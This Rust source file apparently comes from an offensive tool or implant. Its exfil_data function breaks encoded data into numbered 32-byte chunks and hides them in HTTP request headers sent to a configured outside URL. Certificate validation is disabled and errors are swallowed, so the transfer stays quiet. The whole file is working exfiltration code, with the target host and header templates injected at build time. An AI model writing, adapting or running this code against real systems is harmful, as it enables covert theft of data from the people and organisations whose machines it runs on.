use std::error::Error;
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use std::time::Duration;
use std::cmp::min;
use random_string::{charsets::ALPHA_LOWER, generate};
use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};

mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}

async fn send_data(client: &reqwest::Client, encoded_chunk: &str) -> Result<(), Box<dyn Error>> {
    let mut headers = HeaderMap::new();
    for (key, value) in config::HEADERS {
        let header_name = HeaderName::from_bytes(key.as_bytes())?;
        let header_value = HeaderValue::from_str(&value.replace("{{PAYLOAD}}", encoded_chunk))?;
        headers.insert(header_name, header_value);
    }

    let _ = client
        .get(config::TARGET_URL)
        .headers(headers)
        .send()
        .await;

    Ok(())
}

pub async fn exfil_data(encoded_data: &str) -> Result<(), Box<dyn Error>> {
    const CHUNK_SIZE: usize = 32;

    #[cfg(feature = "debug")]
    println!("[*] Generating ID...");

    let id = generate(6, &ALPHA_LOWER);

    #[cfg(feature = "debug")]
    println!("[>] Using ID: {}", id);

    let client = reqwest::Client::builder()
        .http1_title_case_headers()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_millis(500))
        .build()?;

    let mut start = 0;
    let mut chunk_num = 1;
    let total_chunks = encoded_data.len() / CHUNK_SIZE + 1;

    #[cfg(feature = "debug")]
    println!("[*] Sending header payload");
    send_data(&client, &format!("{}.0.{}", URL_SAFE_NO_PAD.encode(&format!("json;{}", total_chunks)), id)).await?;

    loop {
        let end = min(start + CHUNK_SIZE, encoded_data.len());
        let chunk = &encoded_data[start..end];

        #[cfg(feature = "debug")] {
            use std::io::{Write, stdout};
            print!("\r[*] Sending chunk [{:03}/{:03}]", chunk_num, total_chunks);
            stdout().flush().unwrap();
        }

        send_data(&client, &format!("{}.{}.{}", chunk, chunk_num, id)).await?;

        start = end;
        chunk_num += 1;

        if chunk.len() < CHUNK_SIZE {
            break;
        }
    }

    print!("\n");

    Ok(())
}
